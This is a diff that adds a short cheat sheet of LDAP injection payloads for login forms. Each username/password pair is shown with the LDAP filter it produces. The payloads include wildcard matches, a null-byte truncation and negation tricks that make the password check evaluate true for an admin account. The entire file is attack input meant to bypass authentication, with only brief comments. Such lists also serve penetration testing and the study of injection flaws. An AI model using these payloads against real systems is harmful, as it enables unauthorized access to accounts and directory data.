@@ -1,0 +1,36 @@
+user=*
+password=*
+--> (&(user=*)(password=*))
+# The asterisks are great in LDAPi
+
+user=*)(&
+password=*)(&
+--> (&(user=*)(&)(password=*)(&))
+
+user=*)(|(&
+pass=pwd)
+--> (&(user=*)(|(&)(pass=pwd))
+
+user=*)(|(password=*
+password=test)
+--> (&(user=*)(|(password=*)(password=test))
+
+user=*))%00
+pass=any
+--> (&(user=*))%00 --> Nothing more is executed
+
+user=admin)(&)
+password=pwd
+--> (&(user=admin)(&))(password=pwd) #Can through an error
+
+username = admin)(!(&(|
+pass = any))
+--> (&(uid= admin)(!(& (|) (webpassword=any)))) —> As (|) is FALSE then the user is admin and the password check is True.
+
+username=*
+password=*)(&
+--> (&(user=*)(password=*)(&))
+
+username=admin))(|(|
+password=any
+--> (&(uid=admin)) (| (|) (webpassword=any))
